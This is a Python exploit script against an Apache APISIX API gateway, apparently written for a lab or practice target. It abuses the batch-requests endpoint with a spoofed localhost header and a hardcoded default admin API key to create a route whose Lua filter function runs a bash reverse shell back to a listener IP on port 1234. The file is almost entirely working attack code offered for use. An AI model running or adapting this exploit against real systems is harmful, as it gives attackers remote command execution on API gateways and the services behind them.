import requests
import json

# Define the target URL
target_url = 'http://192.168.247.220:43500/'  # Replace with your actual target URL

# Calculate content length
#content_length = len(json_data)

# Headers for the POST request
headers1 = {
    'Host': '127.0.0.1:8080',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69',
    'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Content-Length': '540',  # You might want to recalculate this if the length changes
    'Connection': 'close',
}

# JSON data with properly escaped body field
json_data = {
    "headers": {
        "X-Real-IP": "127.0.0.1",
        "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1",
        "Content-Type": "application/json"
    },
    "timeout": 1500,
    "pipeline": [
        {
            "path": "/apisix/admin/routes/index",
            "method": "PUT",
            "body": json.dumps({
                "uri": "/rms/fzxewh",
                "upstream": {
                    "type": "roundrobin",
                    "nodes": {
                        "schmidt-schaefer.com": 1
                    }
                },
                "name": "wthtzv",
                "filter_func": "function(vars) os.execute('bash -c \\\"0<&160-;exec 160<>/dev/tcp/192.168.45.175/1234;sh <&160 >&160 2>&160\\\"'); return true end"
            })
        }
    ]
}

# Perform the POST request
response1 = requests.post(target_url + 'apisix/batch-requests', headers=headers1, json=json_data, verify=False)

# Print the response status and text
print(response1.status_code)
print(response1.text)
